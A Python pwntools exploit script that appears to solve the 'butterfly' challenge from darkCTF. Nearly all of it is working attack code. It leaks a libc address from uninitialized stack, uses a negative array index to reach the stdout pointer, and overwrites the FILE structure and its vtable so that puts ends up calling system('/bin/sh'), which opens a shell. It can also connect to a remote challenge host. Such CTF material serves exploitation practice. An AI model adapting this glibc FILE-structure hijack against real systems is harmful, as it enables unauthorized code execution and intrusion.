"""
https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

Use uninitialized stack to leak libc

The pass a negative value as the index to the note array, allowing us index backwards. We
use the pointer to stdout that is behind the array in memory, and overwrite the vtable
pointer and to point to the _IO_str_jumps vtable. When puts is called, the
_IO_str_overflow_ function gets called (instead of the normal _IO_file_overflow_), and
we use the method in the link above to gain code execution
"""
from pwn import *

binary_path = "./butterfly"
#lib_path = "/lib/x86_64-linux-gnu/"

#lib_path = "/home/kali/HeapLAB/.glibc/glibc_2.27/"
#LIBC_LEAK_OFFSET = 0x1757a7

lib_path = "./lib/"
LIBC_LEAK_OFFSET = 0x1b39e7

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
     #.above(of="main", display="expressions", size="75%")
     #.left(of="expressions", display="disasm", size="35%")
    .above(of="main", display="stack", size="75%")
    .left(of="stack", display="regs", size="66%")
    .right(of="regs", display="disasm")
).build(nobanner=True)
end

#break main

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc butterfly.darkarmy.xyz 32770
        return remote("butterfly.darkarmy.xyz", 32770)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io):
    print("*** BREAKPOINT ***")
    io.interactive()


io = start()

io.recvuntil("name: ")

if args.REMOTE:
    io.sendline("A" * (0x50-1)) # newline makes it even
else:
    io.sendline("A" * (0x30-1)) # newline makes 8

io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(8, b"\0"))
libc.address = libc_leak - LIBC_LEAK_OFFSET

print(f"LIBC: {hex(libc.address)}")

# Offset of the _IO_2_1_stdout_ pointer
io.sendline("-6")

binsh_addr = next(libc.search(b"/bin/sh\0"))
overwrite_value = (binsh_addr - 100) // 2

vtable_offset = 0x3e8360
vtable_pointer = libc.address + vtable_offset

# Pointer when using debug libc locally
#vtable_pointer = 0x7ffff7dcf360

zero_offset = 0x3eb188
zero_pointer = libc.address + zero_offset

# Pointer when using debug libc locally
#zero_pointer = 0x7fffffffebe0

# Overwrite _IO_2_1_stdout_
fake_file_stream = flat({
    0x20: p64(0), # IO_write_base
    0x28: p64(overwrite_value), # IO_write_ptr
    0x38: p64(0), # IO_buf_base
    0x40: p64(overwrite_value), # IO_buf_end
    0x88: p64(zero_pointer), # _IO_lock
    0xd8: p64(vtable_pointer),
    0xe0: p64(libc.sym.system)
}, filler=b"\0")

io.sendline(fake_file_stream)

io.interactive()

#darkCTF{https://www.youtube.com/watch?v=L2C8rVO2lAg}
